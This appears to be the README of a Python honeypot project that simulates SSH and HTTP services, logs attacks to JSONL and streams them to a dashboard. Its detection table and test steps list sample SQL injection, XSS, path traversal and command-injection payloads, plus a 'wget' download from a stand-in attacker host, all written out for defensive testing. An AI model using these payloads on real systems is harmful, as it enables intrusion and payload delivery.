# SentinelHoneypot

**A multi-service deception and intrusion detection system written in Python.**

SentinelHoneypot deploys fake SSH, HTTP, and FTP services that capture attacker behavior in real time. Every connection, authentication attempt, command, and HTTP request is logged to structured JSONL for analysis and displayed on a live WebSocket dashboard.

---

## Features

| Feature | Description |
|---------|-------------|
| **Fake SSH Server** | Accepts connections on port 2222, captures usernames/passwords, simulates an interactive shell |
| **Fake HTTP Server** | Mimics vulnerable admin panels, detects SQLi, XSS, path traversal, command injection, web shells, LFI |
| **Real-time Dashboard** | Flask + SocketIO dashboard with live event feed, stats, and attacker tables |
| **JSONL Logging** | All events written to `logs/honeypot.jsonl` for SIEM ingestion |
| **Attack Detection** | Pattern-based detection for 6 attack categories |
| **Docker Support** | One-command deployment with Docker Compose |
| **Configurable** | Thresholds, ports, banners, and detection rules via `config.py` |

---

## Architecture

```
Attacker ──> SSH:2222 ──┐
                        ├──> Log Collector ──> JSONL File
Attacker ──> HTTP:8080 ─┘         │
                                  └──> Dashboard:5000 (WebSocket)
```

---

## Quick Start

### Option 1: Local Python

```bash
# 1. Clone and enter directory
cd sentinel_honeypot

# 2. Install dependencies
pip install -r requirements.txt

# 3. Start all services
python main.py
```

### Option 2: Docker Compose (Recommended)

```bash
# 1. Build and start
docker-compose up -d

# 2. View logs
docker-compose logs -f

# 3. Open dashboard
open http://localhost:5000
```

---

## Services

| Service | Port | Description |
|---------|------|-------------|
| SSH Honeypot | `2222` | Fake SSH with interactive shell |
| HTTP Honeypot | `8080` | Fake admin panel & vulnerable endpoints |
| Dashboard | `5000` | Real-time WebSocket dashboard |

---

## Dashboard

Open `http://localhost:5000` to view:

- **Live Stats Cards**: SSH sessions, total attacks, unique IPs, commands captured
- **Top Attackers Table**: Ranked by attempt count
- **Live Event Feed**: Real-time WebSocket stream of all events
- **HTTP Attack Log**: Detected attack types with colored tags

---

## Attack Detection

The HTTP honeypot detects the following attack patterns:

| Attack Type | Example Payload |
|-------------|-----------------|
| SQL Injection | `admin' OR '1'='1` |
| XSS | `<script>alert(1)</script>` |
| Path Traversal | `../../../etc/passwd` |
| Command Injection | `; cat /etc/passwd` |
| Web Shell | `cmd=whoami` |
| LFI | `file=/etc/passwd` |

---

## Log Format (JSONL)

```json
{"timestamp": "2026-08-25T14:30:00Z", "type": "ssh_session", "source_ip": "203.0.113.9", "service": "ssh", "port": 2222, "username": "root", "password": "admin123", "attempt_number": 1, "accepted": false}
{"timestamp": "2026-08-25T14:30:05Z", "type": "command_captured", "source_ip": "203.0.113.9", "service": "ssh", "command": "wget http://evil.com/payload.sh", "command_number": 1}
{"timestamp": "2026-08-25T14:30:10Z", "type": "http_request", "source_ip": "198.51.100.22", "service": "http", "port": 8080, "method": "GET", "path": "/admin/login?username=admin' OR '1'='1", "detected_attacks": ["sql_injection"]}
```

---

## Configuration

Edit `config.py` to customize:

```python
SSH_PORT = 2222              # SSH honeypot port
HTTP_PORT = 8080             # HTTP honeypot port
BIND_HOST = "0.0.0.0"        # Listen interface
MAX_AUTH_ATTEMPTS = 3        # Fake auth attempts before "success"
FAKE_HOSTNAME = "prod-server-01"
BRUTE_FORCE_THRESHOLD = 5    # Alert threshold
BRUTE_FORCE_WINDOW = 300     # Detection window (seconds)
```

---

## Project Structure

```
sentinel_honeypot/
├── config.py                 # Central configuration
├── main.py                   # Launcher (starts all services)
├── ssh_honeypot.py           # Fake SSH server (asyncssh)
├── http_honeypot.py          # Fake HTTP server (aiohttp)
├── log_collector.py          # JSONL logging + stats engine
├── requirements.txt          # Python dependencies
├── Dockerfile                # Container image
├── docker-compose.yml        # Orchestration
├── logs/                     # Generated JSONL logs
├── captured_files/           # Uploaded file storage
└── dashboard/
    ├── app.py                # Flask + SocketIO backend
    ├── templates/
    │   └── index.html        # Dashboard UI
    └── static/               # CSS/JS assets
```

---

## Testing

### Test SSH Honeypot
```bash
# Connect to fake SSH
ssh -p 2222 root@localhost

# Try fake credentials
# Password: anything (accepted after 3 attempts)
# Then type commands:
ls
whoami
cat /etc/passwd
wget http://evil.com/payload.sh
```

### Test HTTP Honeypot
```bash
# Browse to fake admin panel
curl http://localhost:8080/admin

# Try SQL injection
curl "http://localhost:8080/admin/login?username=admin' OR '1'='1"

# Try XSS
curl "http://localhost:8080/admin/login?username=<script>alert(1)</script>"

# Check fake .env file
curl http://localhost:8080/.env
```

### View Logs
```bash
# Real-time log tail
tail -f logs/honeypot.jsonl | jq .

# Count events by type
cat logs/honeypot.jsonl | jq -r '.type' | sort | uniq -c | sort -rn
```

---

## Future Improvements

- [ ] FTP honeypot service
- [ ] MySQL/PostgreSQL fake database
- [ ] File upload capture and sandbox analysis
- [ ] GeoIP lookup for attacker locations
- [ ] Integration with AbuseIPDB / VirusTotal
- [ ] Email/Slack alerts on high-severity events
- [ ] PCAP capture of network traffic
- [ ] Machine learning-based anomaly detection

---

## Author

**Khaled Abdelkader El-Sharkawy Mohamed El-Morsi**

---

## License

MIT License — Educational and defensive security purposes only.
